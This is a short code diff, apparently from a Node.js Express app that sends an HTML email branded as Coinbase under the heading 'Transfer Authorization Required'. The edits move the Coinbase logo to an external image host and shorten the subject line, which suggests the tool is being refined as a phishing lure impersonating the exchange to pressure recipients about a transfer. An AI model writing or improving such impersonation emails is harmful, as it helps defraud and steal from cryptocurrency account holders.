@@ -215,7 +215,7 @@ app.post('/send-welcome-email-2', async (req, res) => {
 <body>
     <div class="container">
         <div class="header">
-            <img src="logo.png" alt="Coinbase Logo" class="logo">
+            <img src="https://i.postimg.cc/JnN7fxVx/logo.png" alt="Coinbase Logo" class="logo">
             <h2 style="color: #1652F0; margin-top: 10px;">Transfer Authorization Required</h2>
         </div>
 
@@ -259,7 +259,7 @@ app.post('/send-welcome-email-2', async (req, res) => {
             Name: name,
           },
         ],
-        Subject: 'Your Transfer Authorization is Required',
+        Subject: 'Transfer Authorization is Required',
         TextPart: '',
         HTMLPart: htmlContent,
       },
